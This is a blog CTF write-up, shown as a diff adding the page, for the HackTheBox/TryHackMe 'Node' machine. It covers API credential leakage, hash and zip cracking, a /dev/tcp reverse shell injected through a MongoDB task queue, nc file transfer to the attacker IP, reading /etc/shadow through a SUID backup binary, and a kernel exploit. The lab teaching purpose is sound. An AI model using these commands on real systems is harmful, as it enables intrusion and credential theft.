@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="icon" type="image/png" href="/favicon.png">
+  <link rel="stylesheet" type="text/css" href="/css/style.css">
+  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Hackthebox - Node / TryHackMe - Node 1 Writeup &mdash; fmash16's blog</title>
+<meta property="og:title" content="Hackthebox - Node / TryHackMe - Node1 Writeup" />
+      <meta property="og:description" content="A medium difficulty linux box exploited using node.js-expressjs, mongodb, a custom backup program and a kernel privesc" />
+      <meta property="og:type" content="article" />
+      <meta property="og:url" content="github" />
+      <meta property="og:image" content="/img/htb_node/card.png" />
+
+</head>
+
+<body>
+  <!-- Side navigation -->
+	<div class="sidebar">
+    <div class="vertical-center">
+      <a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
+      <p style="text-align:center; color:#eee">
+      <b style="font-size:1.7em;text-align:center; color:#eee">fmash16</b><br/>
+      Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
+      <p style="text-align:center;font-size:20px">
+        <a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a> 
+        <a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a> 
+        <a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
+        <a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
+      </p>
+    </div>
+	</div>
+
+<article>
+<h1 id="hackthebox---node-tryhackme---node-1-writeup">Hackthebox - Node / TryHackMe - Node 1 Writeup</h1>
+<div class="figure">
+<img src="/img/htb_node/card.png" />
+
+</div>
+<p>This machine was originally released on hackthebox back in 2018. It is now on tryhackme as well as &quot;Node 1&quot;.</p>
+<p>As usual we add the machine IP to our /etc/hosts file as &quot;node1.thm&quot;</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="bu">echo</span> <span class="st">&quot;10.10.21.105 node1.thm&quot;</span> <span class="op">&gt;&gt;</span> /etc/hosts</code></pre></div>
+<h1 id="nmap-scan">Nmap Scan</h1>
+<p>Open ports:</p>
+<ul>
+<li>22/tcp open ssh</li>
+<li>3000/tcp open ppp</li>
+</ul>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="port-3000">Port 3000</h2>
+<p>We find a webserver running on the port 3000. Going over to http://node1.thm:3000, we find the following</p>
+<div class="figure">
+<img src="/img/htb_node/1.png" />
+
+</div>
+<h2 id="ffuf-fuzzing">ffuf fuzzing</h2>
+<p>Trying to fuzz the URL, we see that any wrong URI redirects to the home page. SO lets filter out the home page responses havein the word count 727.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">ffuf</span> -c -w /usr/share/dirbuster/directory-list-2.3-medium.txt -u http://node1.thm:3000/FUZZ -e .txt,.js -fw 727</code></pre></div>
+<p>We found some directories: * content * assets</p>
+<p>But we don't have permissions to view them and they redirect to the home page</p>
+<h2 id="looking-at-the-source">Looking at the source</h2>
+<p>We try having a look at the source of the login page and find some interesting js files linked there.</p>
+<div class="figure">
+<img src="/img/htb_node/2.png" />
+
+</div>
+<p>We have a look at those js sources and try to get an idea about the app. Looking at the source, it seems to be running <strong>Expressjs</strong>.</p>
+<p>What seems interesting is the file <code>profile.js</code> at <code>http://node1.thm:3000/assets/js/app/controllers/profile.js</code> which basically shows the profile of a user if the user exists. And that user is checked from the directory <code>/api/users/</code>. Lets check if we can view the users going over to the URI.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">curl</span> http://node1.thm:3000/api/users/</code></pre></div>
+<p>And we can! The URL gives us a json file containing the username and passwords. We see that the first user has &quot;is_admin&quot; set to true. So that's our admin user.</p>
+<pre class="txt"><code>{
+  &quot;_id&quot;:&quot;59a7365b98aa325cc03ee51c&quot;,
+  &quot;username&quot;:&quot;myP14ceAdm1nAcc0uNT&quot;,
+  &quot;password&quot;:&quot;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&quot;,  &quot;is_admin&quot;:true
+}</code></pre>
+<p>The password seems to be hashed. We pass it to <a href="https://crackstation.net/">crackstation</a> to crack and get the cracked password. The password was hashed with sha256</p>
+<div class="figure">
+<img src="/img/htb_node/3.png" />
+
+</div>
+<p>Creds found:</p>
+<blockquote>
+<p>User: myP14ceAdm1nAcc0uNT<br />
+Password: manchester</p>
+</blockquote>
+<h2 id="admin-login">Admin login</h2>
+<p>We login with the found creds and get the link to a backup file.</p>
+<div class="figure">
+<img src="/img/htb_node/4.png" />
+
+</div>
+<p>We try downloading the backup but for some reason, it kept getting failed. Curl to the rescue! We intercept the request with the login cookie and use curl to get the file. The request file named <code>req</code> is as follows</p>
+<pre class="txt"><code>GET /api/admin/backup HTTP/1.1
+Host: node1.thm:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101
+Firefox/77.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://node1.thm:3000/admin
+Cookie:
+connect.sid=s%3AmRKtCyf3LqJLawtuaTd9TWYb_qG26wXF.DV1fvdf4Vdw2iDCMMDD7rN66CHfb%2BU4JyXoE57g%2Byts
+Upgrade-Insecure-Requests: 1</code></pre>
+<p>Then we use curl to get the file</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">curl</span> -H @req node1.thm:3000/api/admin/backup <span class="op">&gt;</span> myplace.backup</code></pre></div>
+<h2 id="backup-file">Backup file</h2>
+<p>Looking at the contents of the backup file, it seems to be base64 encoded. And so we decode it.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">cat</span> myplace.backup <span class="kw">|</span> <span class="ex">base64</span> -d <span class="op">&gt;</span> myplace</code></pre></div>
+<p>With the <code>file</code> command, we see that it is a zip file. Let's try decompressing it.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">mv</span> myplace myplace.zip
+<span class="fu">unzip</span> myplace.zip</code></pre></div>
+<p>But the file &quot;var/www/myplace/package-lock.json&quot; is password locked</p>
+<div class="figure">
+<img src="/img/htb_node/5.png" />
+
+</div>
+<h2 id="zip-file-password-crack-with-john">Zip file password crack with John</h2>
+<p>We use john to crack the zip file password</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">zip2john</span> myplace.zip -o var/www/myplace/package-lock.json <span class="op">&gt;</span> myplace.hash
+<span class="ex">john</span> myplace.hash --wordlist=/usr/share/wordlists/rockyou..txt</code></pre></div>
+<p>And we get the cracked password!</p>
+<div class="figure">
+<img src="/img/htb_node/6.png" />
+
+</div>
+<blockquote>
+<p>Password: magicword</p>
+</blockquote>
+<p>We unzip the file using the password.</p>
+<h1 id="privilege-escalation---user-mark">Privilege Escalation - User mark</h1>
+<p>We look at the files in the backup folder. We see the file app.js that contains the monngodb url containing user creds for the user <strong>mark</strong>.</p>
+<pre class="text"><code>mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace</code></pre>
+<p>Creds found:</p>
+<blockquote>
+<p>User: mark<br />
+Password : 5AYRft73VtFpc84k</p>
+</blockquote>
+<p>We try ssh ing into the box with these creds and succeed.</p>
+<div class="figure">
+<img src="/img/htb_node/7.png" />
+
+</div>
+<h1 id="privilege-escalation---user-mark-1">Privilege Escalation - User mark</h1>
+<p>We transfer and run the linpeas.sh privesc script on the target.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">python3</span> -m http.server
+<span class="fu">wget</span> http://10.9.17.253:8000/linpeas.sh
+<span class="fu">bash</span> linpeas.sh</code></pre></div>
+<p>We find an interesting process running on the target.</p>
+<div class="figure">
+<img src="/img/htb_node/8.png" />
+
+</div>
+<p>We find another app.js running from /var/scheduler/app.js. We had a look at the app.js in myplace directory. Let's have a look at this app. Looking into it, we find a new mongodb uri for a database name &quot;scheduler&quot;. Previously, we had found the database named &quot;myplace&quot;</p>
+<pre class="text"><code>const exec        = require(&#39;child_process&#39;).exec;
+const MongoClient = require(&#39;mongodb&#39;).MongoClient;
+const ObjectID    = require(&#39;mongodb&#39;).ObjectID;
+const url
+= &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler&#39;;
+
+MongoClient.connect(url, function(error, db) {
+  if (error || !db) {
+    console.log(&#39;[!] Failed to connect to mongodb&#39;);
+    return;
+  }
+
+  setInterval(function () {
+    db.collection(&#39;tasks&#39;).find().toArray(function (error, docs) {
+      if (!error &amp;&amp; docs) {
+        docs.forEach(function (doc) {
+          if (doc) {
+            console.log(&#39;Executing task &#39; + doc._id + &#39;...&#39;);
+            exec(doc.cmd); &lt;-----------------------------------------------
+            db.collection(&#39;tasks&#39;).deleteOne({ _id: new ObjectID(doc._id) });
+          }
+        });
+      }
+      else if (error) {
+        console.log(&#39;Something went wrong: &#39; + error);
+      }
+    });
+  }, 30000);
+
+});</code></pre>
+<p>Here we see that, the app tries to read the value of &quot;cmd&quot; from the collection named &quot;tasks&quot; in the database &quot;scheduler&quot;, executes it as user &quot;tom&quot; and deletes it. So we have command execution as user tom here. Let's try to get a shell back</p>
+<p>So, we try viewing the database &quot;scheduler&quot; as user mark using <code>mongo</code></p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">mongo</span> -u mark -p 5AYRft73VtFpc84k scheduler</code></pre></div>
+<div class="figure">
+<img src="/img/htb_node/9.png" />
+
+</div>
+<p>We see that the database has a collection named &quot;tasks&quot;. Lets set our reverse shell command in the &quot;cmd&quot; value. We create a script named &quot;shell.sh&quot; in the /tmp folder.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="co">#!/bin/sh</span>
+<span class="fu">bash</span> -i <span class="op">&gt;</span><span class="kw">&amp;</span> <span class="ex">/dev/tcp/10.9.17.253/1337</span> <span class="op">0&gt;&amp;1</span></code></pre></div>
+<p>And we insert the cmd value in the mongodb.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="op">&gt;</span> <span class="ex">db.tasks.insert</span>( { cmd: <span class="st">&quot;bash /tmp/shell.sh&quot;</span> } );</code></pre></div>
+<p>Now, we wait to get our reverse shell back. And after some time, get it.</p>
+<div class="figure">
+<img src="/img/htb_node/10.png" />
+
+</div>
+<h1 id="privilege-escalation---root">Privilege Escalation - root</h1>
+<h2 id="method-1---exploiting-the-backup-program">Method 1 - exploiting the backup program</h2>
+<p>We look for any suid files using find</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">find</span> / -perm /4000 <span class="op">2&gt;</span> /dev/null</code></pre></div>
+<p>And we find the following:</p>
+<div class="figure">
+<img src="/img/htb_node/11.png" />
+
+</div>
+<p>The /usr/local/bin/backup file seems interesting. Having a look at its permissions, we see that it is owned by root and has the admin group ownership. And our user tom is a member of the group admin and so we can run this.</p>
+<div class="figure">
+<img src="/img/htb_node/12.png" />
+
+</div>
+<p>Looking back at the app.js file found in the backup of the app &quot;myplace&quot; we can have some idea about what the backup program does.</p>
+<div class="sourceCode"><pre class="sourceCode js"><code class="sourceCode javascript"><span class="va">app</span>.<span class="at">get</span>(<span class="st">&#39;/api/admin/backup&#39;</span><span class="op">,</span> <span class="kw">function</span> (req<span class="op">,</span> res) <span class="op">{</span>
+  <span class="cf">if</span> (<span class="va">req</span>.<span class="va">session</span>.<span class="at">user</span> <span class="op">&amp;&amp;</span> <span class="va">req</span>.<span class="va">session</span>.<span class="va">user</span>.<span class="at">is_admin</span>) <span class="op">{</span>
+    <span class="kw">var</span> proc <span class="op">=</span> <span class="at">spawn</span>(<span class="st">&#39;/usr/local/bin/backup&#39;</span><span class="op">,</span> [<span class="st">&#39;-q&#39;</span><span class="op">,</span> backup_key<span class="op">,</span> __dirname ])<span class="op">;</span>
+                      <span class="op">----------------------------------------------------</span>
+    <span class="kw">var</span> backup <span class="op">=</span> <span class="st">&#39;&#39;</span><span class="op">;</span>
+
+    <span class="va">proc</span>.<span class="at">on</span>(<span class="st">&quot;exit&quot;</span><span class="op">,</span> <span class="kw">function</span>(exitCode) <span class="op">{</span>
+      <span class="va">res</span>.<span class="at">header</span>(<span class="st">&quot;Content-Type&quot;</span><span class="op">,</span> <span class="st">&quot;text/plain&quot;</span>)<span class="op">;</span>
+      <span class="va">res</span>.<span class="at">header</span>(<span class="st">&quot;Content-Disposition&quot;</span><span class="op">,</span> <span class="st">&quot;attachment; filename=myplace.backup&quot;</span>)<span class="op">;</span>
+      <span class="va">res</span>.<span class="at">send</span>(backup)<span class="op">;</span>
+    <span class="op">}</span>)<span class="op">;</span>
+
+    <span class="va">proc</span>.<span class="va">stdout</span>.<span class="at">on</span>(<span class="st">&quot;data&quot;</span><span class="op">,</span> <span class="kw">function</span>(chunk) <span class="op">{</span>
+      backup <span class="op">+=</span> chunk<span class="op">;</span>
+    <span class="op">}</span>)<span class="op">;</span></code></pre></div>
+<p>So the program takes the &quot;backup_key&quot; and the directory to backup as the argument. We can find the backup key in the app.js file as we..</p>
+<div class="sourceCode"><pre class="sourceCode js"><code class="sourceCode javascript"><span class="kw">const</span> backup_key
+<span class="op">=</span> <span class="st">&#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;</span><span class="op">;</span></code></pre></div>
+<p>Now, we can try to backup the &quot;/root&quot; folder.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">/usr/local/bin/backup</span> -q \
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 \
+/root</code></pre></div>
+<p>And we get the backup as base64 encoded text.</p>
+<div class="figure">
+<img src="/img/htb_node/13.png" />
+
+</div>
+<p>We base64 decode the text to get the backup as a zip file. And unzip it.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">cat</span> backup <span class="kw">|</span> <span class="ex">base64</span> -d <span class="op">&gt;</span> backup.zip
+<span class="ex">7z</span> x backup.zip   # Unzip won<span class="st">&#39;t work</span></code></pre></div>
+<p>And we are prompted for a password for the root.txt file. We try the password we found before for zip, &quot;magicword&quot;.</p>
+<p>Now we extract using the found password to get the root.txt. And we find this.</p>
+<div class="figure">
+<img src="/img/htb_node/15.png" />
+
+</div>
+<p>So what happened here? Lets have a deeper look at the /usr/bin/local/backup program. We see that the machine has ltrace installed. Lets try passing the program through strace.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">ltrace</span> /usr/local/bin/backup -q \
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 \
+/root</code></pre></div>
+<div class="figure">
+<img src="/img/htb_node/16.png" />
+
+</div>
+<p>In the output, we see that the directory to be backed up is matched with some strings like &quot;..&quot;, &quot;/root&quot; and if it matches, something else predifined is written into the backup. Lets try backing up a normal user folder and check what strings the folder name is compared to.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">ltrace</span> /usr/local/bin/backup -q \
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 \
+/home/tom</code></pre></div>
+<div class="figure">
+<img src="/img/htb_node/17.png" />
+
+</div>
+<p>Here we get a complete list of strings the supplied foldername is comapred to. So we have to pass something else to get the backup. We see that though we are not allowed to backup &quot;/root&quot;. But &quot;root&quot; is not blacklisted. So if change our current working directory to &quot;/&quot; and try backing up &quot;root&quot;, we should get it.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">/usr/local/bin/backup</span> -q \
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 \
+root <span class="op">&gt;</span> /tmp/backup</code></pre></div>
+<p>And we transfer the backup to our local machine using nc</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">nc</span> 10.9.17.253 4444 <span class="op">&lt;</span> /tmp/backup
+<span class="ex">nc</span> -lnvp 4444 <span class="op">&gt;</span> backup</code></pre></div>
+<p>And we repeat the previous steps to decode and unzip the backup.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">cat</span> backup <span class="kw">|</span> <span class="ex">base64</span> -d <span class="op">&gt;</span> backup.zip
+<span class="ex">7z</span> x backup.zip</code></pre></div>
+<p>And we get the root directory! With the root.txt file in it.</p>
+<p>Let's try getting the /etc/shadow file. For that we go into the /etc directory and run</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">/usr/local/bin/backup</span> -q \
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 \
+shadow <span class="op">&gt;</span> shadow.bak</code></pre></div>
+<p>And we repeat the steps of decoding and unzipping it with the password magicword. And we get our password shadows.</p>
+<h2 id="method-2--kernel-privesc">Method 2- kernel privesc</h2>
+<p>We have a look at the kernel version the machine is running on</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="fu">uname</span> -a
+  <span class="ex">Linux</span> node 4.4.0-93-generic <span class="co">#116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64</span>
+<span class="ex">x86_64</span> x86_64 GNU/Linux</code></pre></div>
+<p>We search for kernel 4.4.0 exploit using searchsploit</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">searchsploit</span> 4.4.0</code></pre></div>
+<p>And we find a kernel privesc for this kernel version.</p>
+<div class="figure">
+<img src="/img/htb_node/18.png" />
+
+</div>
+<p>We mirror the exploit and transfer it to the target.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">searchsploit</span> -m 44298</code></pre></div>
+<p>On the target, we compile it with gcc, and run the executable to get a root shell</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">gcc</span> 44298.c -o pwn
+<span class="ex">./44298</span></code></pre></div>
+<div class="figure">
+<img src="/img/htb_node/19.png" />
+
+</div>
+</article>
+
+<footer>
+  <p> Generated with a modified version of <a href="https://github.com/fmash16/ssg5">ssg5</a> By fmash16 <br /> 
+  <i class="far fa-copyright"></i> 2020-2020 </p>
+</footer>
+</body>
